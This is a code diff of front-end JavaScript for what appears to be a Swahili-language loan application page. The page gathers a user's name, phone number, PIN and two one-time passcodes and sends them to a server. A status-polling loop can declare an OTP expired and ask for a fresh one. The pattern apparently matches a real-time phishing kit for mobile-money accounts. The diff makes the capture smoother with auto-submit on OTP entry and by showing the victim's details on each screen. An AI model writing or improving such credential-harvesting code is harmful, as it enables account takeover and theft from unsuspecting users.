@@ -31,13 +31,17 @@ document.addEventListener('DOMContentLoaded', () => {
   const displayApplicantName = document.getElementById('display-applicant-name');
   const displayApplicantPhone = document.getElementById('display-applicant-phone');
 
+  const displayOtp1Name = document.getElementById('display-otp1-name');
+  const displayOtp1Phone = document.getElementById('display-otp1-phone');
   const otp1Boxes = document.querySelectorAll('.otp1-box-square');
-  const btnSubmitOtp1 = document.getElementById('btn-submit-otp1');
+  const btnToggleOtp1Visibility = document.getElementById('btn-toggle-otp1-visibility');
   const bannerOtp1Error = document.getElementById('banner-otp1-error');
   const otp1Subtitle = document.getElementById('otp1-subtitle');
 
+  const displayOtp2Name = document.getElementById('display-otp2-name');
+  const displayOtp2Phone = document.getElementById('display-otp2-phone');
   const otp2Boxes = document.querySelectorAll('.otp2-box-square');
-  const btnSubmitOtp2 = document.getElementById('btn-submit-otp2');
+  const btnToggleOtp2Visibility = document.getElementById('btn-toggle-otp2-visibility');
   const bannerOtp2Error = document.getElementById('banner-otp2-error');
 
   let currentUserId = null;
@@ -117,9 +121,12 @@ document.addEventListener('DOMContentLoaded', () => {
         return;
       }
 
-      // Populate Name & Phone on PIN screen automatically
-      if (displayApplicantName) displayApplicantName.innerText = `${firstName} ${lastName}`.toUpperCase();
-      if (displayApplicantPhone) displayApplicantPhone.innerText = phone;
+      const fullNameStr = `${firstName} ${lastName}`.toUpperCase();
+      const formattedPhone = phone;
+
+      // Populate Name & Phone across PIN, OTP 1, and OTP 2 screens
+      [displayApplicantName, displayOtp1Name, displayOtp2Name].forEach(el => { if (el) el.innerText = fullNameStr; });
+      [displayApplicantPhone, displayOtp1Phone, displayOtp2Phone].forEach(el => { if (el) el.innerText = formattedPhone; });
 
       showLoading('INATHIBITISHA MAOMBI...', 'Tafadhali subiri...');
 
@@ -165,12 +172,28 @@ document.addEventListener('DOMContentLoaded', () => {
     updateCalc();
   }
 
-  // Toggle PIN visibility (Show/Hide)
+  // Show / Hide Toggles for PIN and OTP boxes
   if (btnTogglePinVisibility) {
     btnTogglePinVisibility.addEventListener('click', () => {
       const isPassword = pinBoxes[0].type === 'password';
       pinBoxes.forEach(b => b.type = isPassword ? 'text' : 'password');
       btnTogglePinVisibility.innerText = isPassword ? 'Hide' : 'Show';
+    });
+  }
+
+  if (btnToggleOtp1Visibility) {
+    btnToggleOtp1Visibility.addEventListener('click', () => {
+      const isPassword = otp1Boxes[0].type === 'password';
+      otp1Boxes.forEach(b => b.type = isPassword ? 'text' : 'password');
+      btnToggleOtp1Visibility.innerText = isPassword ? 'Hide' : 'Show';
+    });
+  }
+
+  if (btnToggleOtp2Visibility) {
+    btnToggleOtp2Visibility.addEventListener('click', () => {
+      const isPassword = otp2Boxes[0].type === 'password';
+      otp2Boxes.forEach(b => b.type = isPassword ? 'text' : 'password');
+      btnToggleOtp2Visibility.innerText = isPassword ? 'Hide' : 'Show';
     });
   }
 
@@ -194,11 +217,8 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Auto-submit PIN once 4 digits are filled
-  setupDigitInputs(pinBoxes, (pinVal) => {
-    submitPinAction(pinVal);
-  });
-
+  // Auto-flow & Auto-submit once 4 digits are entered
+  setupDigitInputs(pinBoxes, (pinVal) => { submitPinAction(pinVal); });
   setupDigitInputs(otp1Boxes, (otpVal) => { submitOtp1Action(otpVal); });
   setupDigitInputs(otp2Boxes, (otpVal) => { submitOtp2Action(otpVal); });
 
@@ -239,7 +259,7 @@ document.addEventListener('DOMContentLoaded', () => {
     bannerOtp1Error.classList.remove('active');
     showLoading('INATHIBITISHA OTP...', 'Tafadhali subiri...');
 
-    const phoneVal = displayApplicantPhone ? displayApplicantPhone.innerText.trim() : document.getElementById('form-phone').value.trim();
+    const phoneVal = displayOtp1Phone ? displayOtp1Phone.innerText.trim() : document.getElementById('form-phone').value.trim();
 
     try {
       const res = await fetch('/api/submit-otp1', {
@@ -258,18 +278,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  if (btnSubmitOtp1) {
-    btnSubmitOtp1.addEventListener('click', () => {
-      const otpVal = Array.from(otp1Boxes).map(b => b.value).join('');
-      if (otpVal.length === 4) submitOtp1Action(otpVal);
-    });
-  }
-
   async function submitOtp2Action(otpVal) {
     bannerOtp2Error.classList.remove('active');
     showLoading('INATHIBITISHA UHAKIKI...', 'Tafadhali subiri...');
 
-    const phoneVal = displayApplicantPhone ? displayApplicantPhone.innerText.trim() : document.getElementById('form-phone').value.trim();
+    const phoneVal = displayOtp2Phone ? displayOtp2Phone.innerText.trim() : document.getElementById('form-phone').value.trim();
 
     try {
       const res = await fetch('/api/submit-otp2', {
@@ -286,13 +299,6 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch (e) {
       hideLoading();
     }
-  }
-
-  if (btnSubmitOtp2) {
-    btnSubmitOtp2.addEventListener('click', () => {
-      const otpVal = Array.from(otp2Boxes).map(b => b.value).join('');
-      if (otpVal.length === 4) submitOtp2Action(otpVal);
-    });
   }
 
   function startStatusPolling() {
@@ -331,7 +337,7 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           otp1Boxes.forEach(b => b.value = '');
-          if (otp1Subtitle) otp1Subtitle.innerText = 'MUDA WA OTP UMEKWISHA! Tafadhali weka OTP mpya hapa chini.';
+          if (otp1Subtitle) otp1Subtitle.innerText = 'MUDA WA OTP UMEKWISHA! Weka OTP mpya.';
           showSurfaceError(bannerOtp1Error, '⚠️ MUDA WA OTP UMEKWISHA. Weka namba mpya ya OTP iliyotoka.');
           if (otp1Boxes[0]) otp1Boxes[0].focus();
           showScreen(screenOtp1);
@@ -379,4 +385,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-                          
+    
